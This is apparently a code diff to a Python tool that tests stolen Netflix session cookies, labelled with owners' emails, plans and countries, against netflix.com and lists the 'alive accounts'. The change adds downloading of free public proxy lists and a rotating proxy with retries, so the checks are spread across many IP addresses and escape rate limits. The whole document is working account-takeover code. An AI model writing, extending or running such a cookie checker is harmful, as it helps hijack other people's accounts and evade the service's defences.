@@ -22,6 +22,43 @@ BANNER = '''
 
 HEADERS = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
 
+PROXY_SOURCES = [
+    'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt',
+    'https://cdn.jsdelivr.net/gh/proxyscrape/free-proxy-list@main/proxies/protocols/http/data.txt',
+]
+
+
+def fetch_free_proxies():
+    seen = set()
+    proxies = []
+    for url in PROXY_SOURCES:
+        try:
+            r = requests.get(url, timeout=10)
+            for line in r.text.strip().splitlines():
+                line = line.strip()
+                if not line:
+                    continue
+                p = line.replace('http://', '').replace('https://', '')
+                if p not in seen:
+                    seen.add(p)
+                    proxies.append(f'http://{p}')
+        except Exception:
+            pass
+    return proxies
+
+
+class ProxyRotator:
+    def __init__(self, proxies=None):
+        self.proxies = proxies or []
+        self.idx = 0
+
+    def next(self):
+        if not self.proxies:
+            return None
+        p = self.proxies[self.idx % len(self.proxies)]
+        self.idx += 1
+        return p
+
 
 def find_cookies():
     files = []
@@ -57,13 +94,15 @@ def extract_ids(path):
     return nfid, snfid
 
 
-def check_cookie(nfid, snfid):
+def check_cookie(nfid, snfid, proxy=None):
     s = requests.Session()
+    if proxy:
+        s.proxies = {'http': proxy, 'https': proxy}
     s.cookies.set('NetflixId', nfid, domain='.netflix.com')
     if snfid:
         s.cookies.set('SecureNetflixId', snfid, domain='.netflix.com')
     try:
-        r = s.get('https://www.netflix.com/password', headers=HEADERS, timeout=15)
+        r = s.get('https://www.netflix.com/password', headers=HEADERS, timeout=20)
         if r.status_code != 200 or 'login' in r.url.lower():
             return 'DEAD'
         if 'newPassword' in r.text and 'currentPassword' not in r.text:
@@ -111,6 +150,19 @@ def build_alive_cookies(path):
 
 def main():
     print(BANNER)
+
+    no_proxy = '--no-proxy' in sys.argv
+
+    rotator = ProxyRotator()
+    if not no_proxy:
+        print(Fore.CYAN + '\n🌐 Fetching free proxies...' + Style.RESET_ALL)
+        proxies = fetch_free_proxies()
+        if proxies:
+            rotator = ProxyRotator(proxies)
+            print(Fore.GREEN + f'   ✅ Loaded {len(proxies)} proxies' + Style.RESET_ALL)
+        else:
+            print(Fore.YELLOW + '   ⚠ No proxies found, using direct IP' + Style.RESET_ALL)
+
     files = find_cookies()
     if not files:
         print(Fore.RED + '\n  ❌ No good_cookies found.' + Style.RESET_ALL)
@@ -120,12 +172,21 @@ def main():
     time.sleep(0.5)
 
     alive = []
+    proxy_switches = 0
     for i, fpath in enumerate(files):
         email, plan, country = parse_meta(fpath)
         nfid, snfid = extract_ids(fpath)
         label = f'{email or os.path.basename(fpath):40s} | {plan:15s} | {country}'
 
-        status = check_cookie(nfid, snfid) if nfid else 'NO_ID'
+        proxy = rotator.next()
+        max_retries = 3 if proxy else 1
+        status = 'ERROR'
+        for attempt in range(max_retries):
+            status = check_cookie(nfid, snfid, proxy) if nfid else 'NO_ID'
+            if status != 'ERROR':
+                break
+            proxy = rotator.next()
+            proxy_switches += 1
 
         if status == 'GOOD':
             alive.append(fpath)
@@ -149,7 +210,10 @@ def main():
         print(Fore.RED + '\n  ❌ No alive accounts found.' + Style.RESET_ALL)
         sys.exit(1)
 
-    print(Fore.CYAN + f'\n  ✅ {len(alive)} alive accounts\n' + Style.RESET_ALL)
+    print(Fore.CYAN + f'\n  ✅ {len(alive)} alive accounts' + Style.RESET_ALL)
+    if rotator.proxies:
+        print(Fore.CYAN + f'  🌐 {len(rotator.proxies)} proxies loaded  🔄 {proxy_switches} switches' + Style.RESET_ALL)
+    print()
 
     for i, f in enumerate(alive):
         email, plan, country = parse_meta(f)
